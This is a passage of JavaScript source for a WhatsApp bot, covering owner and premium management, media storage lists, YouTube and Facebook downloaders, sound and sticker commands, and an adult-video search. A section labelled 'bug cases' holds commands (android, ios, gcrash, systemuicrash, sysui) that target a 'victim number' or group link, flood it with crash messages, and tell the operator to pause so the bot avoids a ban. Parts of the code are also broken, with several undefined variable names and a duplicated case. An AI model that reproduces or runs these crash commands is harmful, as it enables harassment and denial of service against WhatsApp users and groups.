                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoAvi) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoAvi.length}*`
                replygcAvi(teks)
            }
            await sendReaction('✔');
            break
            case 'addowner':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
if (!args[0]) return replygcAvi(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Avishka.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcAvi(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcAvi(`Number ${bnnd} Has Become An Owner!!!`)
await sendReaction('✔');
break
case 'delowner':
    await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
if (!args[0]) return replygcAvi(`Use ${prefix+command} nomor\nExample ${prefix+command} 91attac09137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcAvi(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
await sendReaction('✔');
break
            case 'addvideo':
                await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Video Name?')
                if (VideoAvi.includes(q)) return replygcAvi("The name you entered already exists")
                let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
                VideoAvi.push(q)
                await fsx.copy(delb, `./AMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoAvi))
                fs.unlinkSync(delb)
                replygcAvi(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            await sendReaction('✔');
            break
            case 'delvideo': 
            await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Enter the Video Name')
                if (!VideoAvi.includes(q)) return replygcAvi("Name Does Not Exist in Database")
                let wanu = VideoAvi.indexOf(q)
                VideoAvi.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoAvi))
                fs.unlinkSync(`./AMedia/video/${q}.mp4`)
                replygcAvi(`Successfully Deleted Video ${q}`)
            }
            await sendReaction('✔');
            break
            case 'addimage':
                await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('The name of the image?')
                if (ImageAvi.includes(q)) return replygcAvi("The name you entered is already registered in the database")
                let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
                ImageAvi.push(q)
                await fsx.copy(delb, `./AMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageAvi))
                fs.unlinkSync(delb)
                replygcAvi(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            await sendReaction('✔');
            break
            case 'delimage': 
            await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Enter the Image Name')
                if (!ImageAvi.includes(q)) return replygcAvi("The image name you entered is not registered")
                let wanu = ImageAvi.indexOf(q)
                ImageAvi.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageAvi))
                fs.unlinkSync(`./AMedia/image/${q}.jpg`)
                replygcAvi(`Successfully Deleted Image ${q}`)
            }
            await sendReaction('✔');
            break
            case 'addsticker': 
            await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Enter the name of the sticker?')
                if (StickerAvi.includes(q)) return replygcAvi("Name Already In Use")
                let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
                StickerAvi.push(q)
                await fsx.copy(delb, `./AMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerAvi))
                fs.unlinkSync(delb)
                replygcAvi(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            await sendReaction('✔');
            break
            case 'delsticker':
                await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Enter the name of the sticker')
                if (!StickerAvi.includes(q)) return replygcAvi("Name Not Registered in Database")
                let wanu = StickerAvi.indexOf(q)
                StickerAvishka.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerAvi))
                fs.unlinkSync(`./AMedia/sticker/${q}.webp`)
                replygcAvi(`Successfully Removed Sticker ${q}`)
            }
            await sendReaction('✔');
            break
            case 'addvn':
                await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Enter the Name?')
                if (VoiceNoteAvi.includes(q)) return replygcAvi("Name Already In Use")
                let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
                VoiceNoteAvi.push(q)
                await fsx.copy(delb, `./AMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteAvi))
                fs.unlinkSync(delb)
                replygcAvi(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            await sendReaction('✔');
            break
            case 'delvn': 
            await sendReaction('⏳');
            {
                if (!isPremium) return replygcAvi(mess.prem)
                if (args.length < 1) return replygcAvi('Enter the Name')
                if (!VoiceNoteAvi.includes(q)) return replygcAvi("Name Not Registered in Database")
                let wanu = VoiceNoteAvi.indexOf(q)
                VoiceNoteAvi.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteAvi))
                fs.unlinkSync(`./AMedia/audio/${q}.mp3`)
                replygcAvi(`Successfully Deleted Audio ${q}`)
            }
            await sendReaction('✔');
            break
case 'addzip':
    await sendReaction('⏳');
{
if (!isPremium) return replygcAvi(mess.prem)
await loading()
if (args.length < 1) return replygcAvi(`What's the zip name?`)
let teks = `${text}`
{
if (ZipAvi.includes(teks)) return replygcAvi("This name is already in use")
let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
ZipAvi.push(teks)
await fsx.copy(delb, `./AMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipAvi))
fs.unlinkSync(delb)
replygcAvi(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
await sendReaction('✔');
break
case 'delzip':
    await sendReaction('⏳');
{
if (!isPremium) return replygcAvi(mess.prem)
await loading()
if (args.length < 1) return replygcAvi('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipAvi.includes(teks)) return replygcAvi("This name does not exist in the database")
let wanu = ZipAvi.indexOf(teks)
ZipAvi.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipAvi))
fs.unlinkSync(`./AMedia/zip/${teks}.zip`)
replygcAvi(`Successfully deleted zip ${teks}`)
}
}
await sendReaction('✔');
break
case 'listzip': 
await sendReaction('⏳');
{
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipAvi) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipAvi.length}*`
replygcAvi(teksooooo)
}
await sendReaction('✔');
break
case 'addapk':
    await sendReaction('⏳');
{
if (!isPremium) return replygcAvi(mess.prem)
await loading()
if (args.length < 1) return replygcAvi('What is the name of the apk?')
let teks = `${text}`
{
if (ApkAvi.includes(teks)) return replygcAvi("This name is already in use")
let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./AMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkAvi))
fs.unlinkSync(delb)
replygcAvi(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
await sendReaction('✔');
break
case 'delapk':
    await sendReaction('⏳');
{
if (!isPremium) return replygcAvi(mess.prem)
await loading()
if (args.length < 1) return replygcAvi('Name of the apk?')
let teks = `${text}`
{
if (!ApkAvi.includes(teks)) return replygcAvi("This name does not exist in the database")
let wanu = ApkAvi.indexOf(teks)
ApkAvi.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkAvi))
fs.unlinkSync(`./AMedia/apk/${teks}.apk`)
replygcAvi(`Successfully deleted Apk ${teks}`)
}
}
await sendReaction('✔');
break
case 'listapk': 
await sendReaction('⏳');
{
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkAvi) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkAvi.length}`
replygcAvi(teksoooooo)
}
await sendReaction('✔');
break
case 'addpdf':
    await sendReaction('⏳');
{
if (!isPremium) return replygcAvi(mess.prem)
await loading()
if (args.length < 1) return replygcAvi('What is the name of the pdf')
let teks = `${text}`
{
if (DocAvi.includes(teks)) return replygcAvi("This name is already in use")
let delb = await Avishka.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./AMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocAvi))
fs.unlinkSync(delb)
replygcAvi(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
await sendReaction('✔');
break
case 'delpdf':
    await sendReaction('⏳');
{
if (!isPremium) return replygcAvi(mess.prem)
await loading()
if (args.length < 1) return replygcAvi('Enter the name')
let teks = `${text}`
{
if (!DocAvi.includes(teks)) return replygcAvi("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocAvi))
fs.unlinkSync(`./AMedia/doc/${teks}.pdf`)
replygcAvi(`Successfully deleted pdf ${teks}`)
}
}
await sendReaction('✔');
break
case 'listpdf': 
await sendReaction('⏳');
{
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcAvi(teksoooo)
}
await sendReaction('✔');
break
            case 'afk':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (isAfkOn) return replygcAvi("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcAvi(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                await sendReaction('✔');
                break
case 'play':  case 'song':
    await sendReaction('⏳');
{
if (!text) return replygcAvi(`Example : ${prefix + command} anime whatsapp status`)
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await Avishka.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
await sendReaction('✔');
break 
case "ytmp3": case "ytaudio":
    await sendReaction('⏳');
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygcAvi(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await Avishka.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }
    },
},{quoted:m})
await fs.unlinkSync(audio.path)
await sendReaction('✔');
break
case 'ytmp4': case 'ytvideo': 
await sendReaction('⏳');
{
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcAvi(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await Avishka.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
await sendReaction('✔');
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
    await sendReaction('⏳');
Avishka_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Avishka.sendMessage(m.chat, { audio: Avishka_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })   
await sendReaction('✔');
break

//bug cases
case "android": 
await sendReaction('⏳');
{
  if (!isPremium) return replygcAvi(mess.prem)
  if (!text) return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcAvi("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "94772836332") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcAvi("The number is not registered on WhatsApp");
  }
  replygcAvi("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
await sendReaction('✔');
break;
case "ios":
    await sendReaction('⏳');
{
  if (!isPremium) return replygcAvi(mess.prem)
  if (!text) return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcAvi("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "94772836332") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcAvi("The number is not registered on WhatsApp");
  }
  replygcAvi("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
await sendReaction('✔');
break;
case "ios2":
    await sendReaction('⏳');
  {
	if (!isPremium) return replygcAvi(mess.prem)
    if (!isBot) {
      return replygcAvi("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcAvi(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcAvi("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcAvi("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  await sendReaction('✔');
  break;
  case "android2":
    await sendReaction('⏳');
  {
	if (!isPremium) return replygcAvi(mess.prem)
    if (!isBot) {
      return replygcAvi("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcAvi(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcAvi("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcAvi("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  await sendReaction('✔');
  break;
  case "gcrash":
    case'grpcrash':
    await sendReaction('⏳');
  {
    if (!isPremium) return replygcAvi(mess.prem)
    if (!text) {
      return replygcAvi("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcAvi("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcAvi("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await Avishka.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcAvi("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      Avishka.groupLeave(groupTarget);
    } catch (error) {
      replygcAvi(util.format(error));
    }
  }
  await sendReaction('✔');
  break;
  case "systemuicrash": 
  await sendReaction('⏳');
  {
  if (!isPremium) return replygcAvi(mess.prem)
  if (!text) return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcAvi("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "94772836332") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcAvi("The number is not registered on WhatsApp");
  }
  replygcAvi("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
await sendReaction('✔');
break;
case "sysui": 
await sendReaction('⏳');
{
  if (!isPremium) return replygcAvi(mess.prem)
  if (!text) return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcAvi(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcAvi("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "94772836332") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcAvi("The number is not registered on WhatsApp");
  }
  replygcAvi("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
await sendReaction('✔');
break;
case 'clearall':
    await sendReaction('⏳');
{
if (!isCreator) return replygcAvi(mess.owner)
Avishka.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
await sendReaction('✔');
break
case 'clear':
    await sendReaction('⏳');
Aviimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
await sendReaction('✔');
break

//═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════//

case 'girl':
    await sendReaction('⏳');
await XeonStickWait()
var asupan = JSON.parse(fs.readFileSync('./tiktokgirl.json'))
var hasil = pickRandom(asupan)
Avshka.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
await sendReaction('✔');
break




//----------------------------------------------------------------------------------------------------------------------------------------------------------
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': case 'kiss': case 'bite': case 'yeet': case 'neko': case 'bully': case 'bonk': case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': case 'shinobu': case 'megumin': case 'handhold': 
await sendReaction('⏳');
{



    let dat = await fetchJson('https://api.waifu.pics/sfw/'+command)
    let img = dat.url
    let imgs = await (await fetch(img)).buffer()
    
    Avishka.sendVideoAsSticker(m.chat, imgs, m, { packname: global.packname, author: global.author })
    

}
await sendReaction('✔');
break


//---------------self-------------------------------------------------------------------------------------------------------------------------------------------

case 'yts': case 'ytsearch':
    await sendReaction('⏳');
{
    if (!text) return replygcAvi(`Example : ${prefix + command} story wa anime`)
    let yts = require("yt-search")
    let search = await yts(text)
    let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
    let no = 1
    for (let i of search.all) {
        teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
    }
    Avishka.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
await sendReaction('✔');
break
case 'play':  case 'song': 
await sendReaction('⏳');
{
if (!text) return replygcAvi(`Example : ${prefix + command} anime whatsapp status`)
const xeonplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
let search = await yts(text)
let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await Avishka.sendMessage(m.chat,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: botname,
thumbnail: await fetchBuffer(pl.meta.image),
sourceUrl: websitex,
mediaType:2,
mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
await sendReaction('✔');
break

/*|⬡════════════════════════════════════════════|❝   𝙰vi - logo  ™ ❞|═══════════════════════════════════════════⬡|*/ 



case 'sc':
    await sendReaction('⏳');
    if (!isCreator) return replygcAvi(mess.owner)
    replygcAvi('Wait a moment, currently retrieving your session file')
    let ses = await fs.readFileSync('./session/sc.zip')
    Avishka.sendMessage(m.chat, {
        document: sesi,
        mimetype: 'application/json',
        fileName: 'creds.json'
    }, {
        quoted: m
    })
    await sendReaction('✔');
    break










case 'style': case 'styletext': case 'fancy':
    await sendReaction('⏳');
{
    if (!isPremium && global.global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
global.db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./lib/scraper')
if (!text) m.reply(m.chat, 'Enter Query text!', m)
        let anu = await styletext(text)
        let teks = `Style Text From *${text}*\n\n`
        let no = 1
        for (let i of anu) {
            teks += `${icon} ${no++} : ${i.result}\n\n`
        }
        m.reply(teks)
}
await sendReaction('✔');
break

//facebook

case 'facebook2': case 'fb2':
    await sendReaction('⏳');
{
    if (!text) return replygcAvi(`Enter the link!!!`)
    if (!isUrl(args[0])) return replygcAvi(`Where is the link?`)
    await Avishka.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
    try{
    let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)
    Avishka.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: 'Here you go!' }, { quoted: m })
    await Avishka.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
    }catch (error) {
    await Avishka.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
    }
    }
    await sendReaction('✔');
    break

    //

    case 'fb':
        case 'facebook':
case 'facebookvid': 
await sendReaction('⏳');
{
        if (!args[0]) {
 return replygcAvi(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
}
const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
if (!urlRegex.test(args[0])) {
 return replygcAvi('Url invalid')
}
try {
 const result = await fg.fbdl(args[0]);
 const tex = `
     [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
 const response = await fetch(result.videoUrl)
 const arrayBuffer = await response.arrayBuffer()
 const videoBuffer = Buffer.from(arrayBuffer)
 Avishka.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
} catch (error) {
 replygcAvi('Maybe private video!')
}
}
await sendReaction('✔');
break

//═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
//                                                         new bug function
//═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════


case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	//if (!m.isGroup) return XeonStickGroup()
	//if (!AntiNsfw) return replygcAvi(mess.nsfw)
  if (!text) return replygcAvi(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return replygcAvi('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
